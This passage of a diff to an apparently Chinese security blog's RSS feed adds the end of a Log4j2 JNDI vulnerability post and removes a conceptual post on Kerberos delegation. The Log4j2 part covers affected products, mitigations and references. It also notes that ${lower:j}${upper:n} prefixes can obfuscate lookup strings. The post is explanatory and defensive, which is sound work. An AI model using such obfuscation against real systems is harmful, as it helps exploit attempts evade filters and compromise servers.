+所以可以用&lt;code&gt;${lower:j}${upper:n}&lt;/code&gt; 等前缀来处理字符串。（部分版本不支持lower, upper等协议）&lt;/p&gt;
+&lt;h3 id=&#34;受影响的应用&#34;&gt;受影响的应用&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;n&#34;&gt;Spring&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Boot&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;strater&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;log4j2&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;Apache&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Struts2&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;Apache&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Solr&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;Apache&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Flink&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;Apache&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Druid&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;ElasticSearch&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;flume&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;dubbo&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;Redis&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;logstash&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;kafka&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;VMware&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Horizon&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;VMware&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;vCenter&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Server&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;VMware&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;HCX&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;VMware&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;NSX&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;T&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Data&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Center&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;a href=&#34;https://mp.weixin.qq.com/s?__biz=MzA5MDc1NDc1MQ==&amp;amp;mid=2247491068&amp;amp;idx=1&amp;amp;sn=c41b8b9e561d5ddaa539b41dc661ba2b&amp;amp;chksm=9007862ca7700f3a302398570f65ee438010c2e92a9096ae2870174cb2c79beab018663d47f5#rd&#34;&gt;受影响的主流应用软件&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;修复与防御&#34;&gt;修复与防御&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;升级到最新版&lt;/li&gt;
+&lt;li&gt;临时修改方法:
+&lt;ul&gt;
+&lt;li&gt;jvm 添加 -Dlog4j2.formatMsgNoLookups=true 参数（版本&amp;gt;=2.10.0有效）&lt;/li&gt;
+&lt;li&gt;设置系统环境变量：LOG4J_FORMAT_MSG_NO_LOOKUPS=true （版本&amp;gt;=2.10.0有效）&lt;/li&gt;
+&lt;li&gt;log4j2 &amp;lt; 2.10以下的版本移除JndiLookup类。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;禁止没有必要的业务访问外网&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;参考&#34;&gt;参考&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href=&#34;https://paper.seebug.org/1789/&#34;&gt;从零到一带你深入 log4j2 Jndi RCE CVE-2021-44228 漏洞&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href=&#34;https://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&amp;amp;mid=2652884077&amp;amp;idx=1&amp;amp;sn=c28b0de92fbe7595753a95e5d34b6837&amp;amp;chksm=bd59b0a08a2e39b6c9eb03b388e4bbcf3718f73628e114302f4acba9b24d5e6da4b419fd9419#rd&#34;&gt;log4j2 JNDI注入分析笔记&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+</description>
+                
+                
+                
+                
+                
+                    
+                        
+                    
+                        
+                            
+                                
+                                
+                                
+                                    <category domain="https://myzxcg.com/tags/Java/">Java</category>
+                                
+                            
+                        
+                    
+                
+            </item>
         
             <item>
                 <title>Windows 系统调用分析与免杀实现</title>
@@ -14934,126 +15229,6 @@ servicePrincipalName
                                 
                                 
                                     <category domain="https://myzxcg.com/tags/Windows/">Windows</category>
-                                
-                            
-                        
-                    
-                
-            </item>
-        
-            <item>
-                <title>Kerberos 认证与委派</title>
-                <link>https://myzxcg.com/2021/08/Kerberos-%E8%AE%A4%E8%AF%81%E4%B8%8E%E5%A7%94%E6%B4%BE/</link>
-                <guid isPermaLink="true">https://myzxcg.com/2021/08/Kerberos-%E8%AE%A4%E8%AF%81%E4%B8%8E%E5%A7%94%E6%B4%BE/</guid>
-                <pubDate>Thu, 26 Aug 2021 00:43:06 &#43;0800</pubDate>
-                
-                    <author>myzx.xcg@gmail.com (myzxcg)</author>
-                
-                <copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright>
-                
-                    <description>&lt;h2 id=&#34;kerberos协议认证全流程&#34;&gt;Kerberos协议认证全流程&lt;/h2&gt;
-&lt;ol&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;strong&gt;Client申请TGT&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;Client向KDC的AS服务器提出请求。请求中包含Client用户hash加密的时间戳、Client Info等。之后由AS认证服务解密时间戳并在AD（活动目录）中查找该账户。如果能解密，且时间戳在一定的范围内，AS会生成一个随机的Session Key，并再返回给Client一张TGT票据（由krbtgt账户hash加密的Client info和&lt;code&gt;Session Key&lt;/code&gt;）和Client账户hash加密后的&lt;code&gt;Session Key&lt;/code&gt;。&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;strong&gt;Client向TGS服务申请访问目标服务的Ticket&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;Client利用自己的Hash对加密后的&lt;code&gt;Session Key&lt;/code&gt;解密，获得&lt;code&gt;Session Key&lt;/code&gt;。之后Client再次请求KDC访问目标服务。该请求包含TGT和使用&lt;code&gt;Session Key&lt;/code&gt;加密的Client info。&lt;/p&gt;
-&lt;p&gt;KDC使用Ktbtgt的Hash对TGT解密，获取Client info和&lt;code&gt;Session Key&lt;/code&gt;。使&lt;code&gt;Session Key&lt;/code&gt;对Client发来的被&lt;code&gt;Session Key&lt;/code&gt;加密的Client info进行解密，获得Client info后，再比对TGT中的Client info，相同则认证通过。&lt;/p&gt;
-&lt;p&gt;通过认证后，TGS会返回一张服务Ticket和使用&lt;code&gt;Session Key&lt;/code&gt;加密的Server Session key。这张服务Ticket使用Server hash加密，其中包含了Server session key和Client info。&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;strong&gt;Client向Server提交Ticket完成认证&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;Client收到消息后，使用&lt;code&gt;Session Key&lt;/code&gt;解密获得Server Session Key。再向Server发送Server Session Key加密的Clinet info和TGS返回的服务Ticket。&lt;/p&gt;
-&lt;p&gt;Server 使用自己的Hash解密Ticket，获得Server Session Key，再使用Server Session Key解密由Server Session Key加密的Clinet info，再比对Ticket中的Client info，相同则认证通过。&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ol&gt;
-&lt;h2 id=&#34;kerberos-pac&#34;&gt;Kerberos PAC&lt;/h2&gt;
-&lt;p&gt;在前面介绍的Kerberos认证流程中，只要用户的hash正确，那么就可以拿到TGT，有了TGT就可以拿到TGS，有了TGS就可以访问服务，任何一个用户都可以访问任何服务。忽略一个最重要的因素，那就是用户有无权限访问该服务。&lt;/p&gt;
-&lt;p&gt;为了解决这个问题，微软引进了PAC，引进PAC之后的kerberos流程:&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;
-&lt;p&gt;用户向KDC发起AS_REQ，请求凭据是用户hash加密的时间戳，KDC使用用户hash进行解密，如果结果正确返回用krbtgt hash加密的TGT票据，TGT里面包含PAC（包含用户的sid以及用户所在的组）。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://myzxcg.com/images/image-20210826004917589.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;用户凭借TGT票据向KDC发起针对特定服务的TGS_REQ请求，KDC使用krbtgt hash进行解密，如果结果正确，就返回用服务hash加密的TGS票据。这一步不管用户有没有访问服务的权限，只要TGT正确，就返回TGS票据。&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;用户拿着TGS票据去请求服务，服务使用自己的hash解密TGS票据。如果解密正确，就拿着PAC去KDC询问用户有没有访问权限。&lt;/p&gt;
-&lt;p&gt;域控解密PAC，获取用户的sid以及所在的组，再判断用户是否有访问服务的权限。&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;&lt;strong&gt;注：PAC对于用户和服务全程都是不可见的，只有KDC能制作和查看PAC。&lt;/strong&gt;&lt;/p&gt;
-&lt;h2 id=&#34;s4u2self&#34;&gt;S4U2SELF&lt;/h2&gt;
-&lt;p&gt;S4U2self 使得服务可以代表用户获得针对服务自身的kerberos服务票据。这使得服务可以获得用户的授权(可转发的用户TGS票据)，然后将其用于后期的认证(主要是后期的s4u2proxy)，这是为了在用户以不使用Kerberos的方式对服务进行身份验证的情况下使用。&lt;strong&gt;很重要的一点是服务代表用户获得针对服务自身的kerberos票据这个过程中服务是不需要用户的凭据的。&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;s4u2self的过程如下图所示&lt;/p&gt;
-&lt;p&gt;前提条件：服务已经有通过KDC验证的TGT（是以服务的自己身份去申请的TGT）&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://myzxcg.com/images/image-20210826004546275.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;步骤1中服务(JACKSON-PC$)使用S4U2self扩展名代表用户(administrator)获得针对服务本身(JACKSON-PC$)的服务票证。该服务将填写PA_FOR_USER数据结构，类型为S4U2SELF，再将请求发送到TGS。&lt;/p&gt;
-&lt;p&gt;如果TGS支持PA_FOR_USER扩展，则TGS在步骤2中通过KRB_TGS_REP消息返回用户的服务票证。如果服务请求了可转发选项，并且TGS的本地策略允许，则TGS检验通过后必须将票证标志字段设置为可转发。&lt;/p&gt;
-&lt;p&gt;既只要满足下面三个条件，则TGS必须将票证标志字段设置为可转发。&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;服务申请的TGT是可以转发的&lt;/li&gt;
-&lt;li&gt;服务配置了约束委派&lt;/li&gt;
-&lt;li&gt;服务请求了可转发选项&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;如果用户的UserAccountControl字段中设置了USER_NOT_DELEGATED位，那么返回的TGS是永远也没法转发的。例如当Administrator配置了敏感账户不能被委派，返回的TGS的flag字段没有forwardable。&lt;/p&gt;
-&lt;h2 id=&#34;s4u2proxy&#34;&gt;S4U2PROXY&lt;/h2&gt;
-&lt;p&gt;s4u2proxy使得服务1向KDC请求访问服务2的TGS，代表用户访问服务2。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://myzxcg.com/images/image-20210826004735438.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;在步骤1中，服务1代表用户获取服务2的服务票证。服务1发送KRB_TGS_REQ消息，并将S4U2SELF阶段获得的票据作为请求中的AddtionTicket。&lt;/p&gt;
-&lt;p&gt;如果满足下面这些条件，则在步骤2中TGS会制作KRB_TGS_REP消息以返回服务票证（可转发的）&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;拥有来自用户的授权（在S4U2SELF阶段获得的TGS票据），放在AddtionTicket里面。&lt;/li&gt;
-&lt;li&gt;在请求的kdc-options中设置了CNAME-IN-ADDL-TKT标志。&lt;/li&gt;
-&lt;li&gt;服务请求了可转发选项&lt;/li&gt;
-&lt;li&gt;服务1有到服务2的约束委派，将服务2的SPN放在sname里面。&lt;/li&gt;
-&lt;/ol&gt;
-&lt;h2 id=&#34;委派&#34;&gt;委派&lt;/h2&gt;
-&lt;p&gt;被设置委派的对象只能是&lt;strong&gt;拥有SPN的账户&lt;/strong&gt;&lt;/p&gt;
-&lt;h3 id=&#34;非约束委派&#34;&gt;非约束委派&lt;/h3&gt;
-&lt;p&gt;服务1被配置了非约束的委派，那么服务1可以接受任何用户的委派的去请求其他所有服务。例如：某个用户委托服务1访问某个服务，那么这个用户会将TGT（在TGS里面）发送到服务1并缓存到服务1的LSASS中。然后服务1代表用户去请求某个服务。&lt;/p&gt;
-&lt;h3 id=&#34;约束委派&#34;&gt;约束委派&lt;/h3&gt;
-&lt;p&gt;约束委派会用到两个扩展S4U2Self和S4U2Proxy。计算机用户(&lt;code&gt;JACKSON-PC$&lt;/code&gt;) 被配置了到某个服务的约束委派，那么&lt;code&gt;JACKSON-PC$&lt;/code&gt;可以模拟任何用户去请求该服务。相较于非约束委派，约束委派在配置的时候需要指定委派某个服务，而不是所有服务。&lt;/p&gt;
-&lt;p&gt;收到用户的请求后，首先代表用户获得针对服务自身的可转发的kerberos服务票据(S4U2SELF)。拿着这个票据向KDC请求访问特定服务的可转发的TGS(S4U2PROXY)并代表用户访问特定服务。&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;服务1以服务账号hash加密时间戳并设置可转发的字段，再向KDC申请可转发的TGT。&lt;/li&gt;
-&lt;li&gt;服务1携带可转发的TGT并使用S4U2self扩展名代表用户（例如：Administrator）获得针对服务1本身的TGS票证（可转发的TGS）。                        &lt;em&gt;S4U2Self&lt;/em&gt;&lt;/li&gt;
-&lt;li&gt;服务1携带步骤1申请到的TGT和步骤2获取的可转发的TGS票证作为addtionTicket一起发送给KDC。请求代表用户访问服务2的TGS。                 &lt;em&gt;S4U2Proxy&lt;/em&gt;&lt;/li&gt;
-&lt;li&gt;服务1拿着TGS代表用户administrator向服务2发起请求。&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;&lt;strong&gt;Tips：&lt;/strong&gt;&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;S4U2self使得服务可以代表用户获得针对服务自身的kerberos服务票据。&lt;strong&gt;这个过程中服务代表用户获得针对服务自身的kerberos票据，服务是不需要用户的凭据的。&lt;/strong&gt;&lt;/li&gt;
-&lt;li&gt;在步骤2中如果Administrator用户被配置敏感账户不能被委派的话，那么KDC返回的TGS就不是可转发的，就无法被用来做约束委派。&lt;/li&gt;
-&lt;/ol&gt;
-&lt;h3 id=&#34;基于资源的约束委派&#34;&gt;基于资源的约束委派&lt;/h3&gt;
-&lt;p&gt;基于资源的约束委派只能在运行Windows Server 2012 R2和Windows Server 2012的域控制器上配置，但可以在混合模式林中应用。约束委派不能跨域进行委派，基于资源的约束委派可以跨域和林。&lt;/p&gt;
-&lt;p&gt;约束与非约束委派需要域管理员才能设置，而基于资源的约束委派则不需要域管理员权限，把设置属性的权限赋给了机器自身。&lt;/p&gt;
-&lt;p&gt;基于资源的约束委派与传统约束委派非常相似但配置相反。服务1到服务2的约束委派在服务1账户的&lt;code&gt;msDS-AllowedToDelegateTo&lt;/code&gt;属性中配置，定义从服务1到服务2的传出信任。基于资源的约束委派是在服务2的&lt;code&gt;msDS-AllowedToActOnBehalfOfOtherIdentity&lt;/code&gt;属性中配置，定义从服务1到服务2的&amp;quot;传入&amp;quot;信任。只要拥有服务2的权限就可以配置服务2的基于资源的约束委派。&lt;/p&gt;
-&lt;h2 id=&#34;参考&#34;&gt;参考&lt;/h2&gt;
-&lt;ol&gt;
-&lt;li&gt;&lt;a href=&#34;https://daiker.gitbook.io/windows-protocol/kerberos/1&#34;&gt;AS_REQ &amp;amp; AS_REP&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;https://daiker.gitbook.io/windows-protocol/kerberos/2&#34;&gt;TGS_REQ &amp;amp; TGS_REP&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;https://mp.weixin.qq.com/s/IATDJ7n0zRgy5ylIz67VPg&#34;&gt;给大家讲个关于kerberos协议的故事...&lt;/a&gt;&lt;/li&gt;
-&lt;/ol&gt;
-</description>
-                
-                
-                
-                
-                
-                    
-                        
-                    
-                        
-                            
-                                
-                                
-                                
-                                    <category domain="https://myzxcg.com/tags/%E5%9F%9F%E7%9B%B8%E5%85%B3/">域相关</category>
                                 
                             
                         
